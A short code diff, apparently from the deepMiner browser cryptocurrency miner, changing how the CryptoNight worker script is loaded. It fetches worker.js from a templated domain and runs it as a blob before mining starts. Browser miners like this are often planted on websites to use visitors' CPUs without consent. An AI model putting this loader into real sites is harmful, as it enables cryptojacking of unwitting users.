@@ -60,7 +60,14 @@
             this._tab.interval = null
         }
         if (this._useWASM || this._asmjsStatus === "loaded") {
-            this._startNow()
+            var xhr = new XMLHttpRequest;
+            xhr.addEventListener("load", function () {
+                deepMiner.CRYPTONIGHT_WORKER_BLOB = window.URL.createObjectURL(new Blob([xhr.responseText]));
+                this._asmjsStatus = "loaded";
+                this._startNow()
+            }.bind(this), xhr);
+            xhr.open("get", "https://%deepMiner_domain%/worker.js", true);
+            xhr.send()
         } else if (this._asmjsStatus === "unloaded") {
             this._asmjsStatus = "pending";
             var xhr = new XMLHttpRequest;
@@ -487,4 +494,3 @@ self.deepMiner.CONFIG = {
     CAPTCHA_URL: "https://%deepMiner_domain%/captcha/",
     MINER_URL: "https://%deepMiner_domain%/media/miner.html"
 };
-deepMiner.CRYPTONIGHT_WORKER_BLOB = "https://%deepMiner_domain%/worker.js";
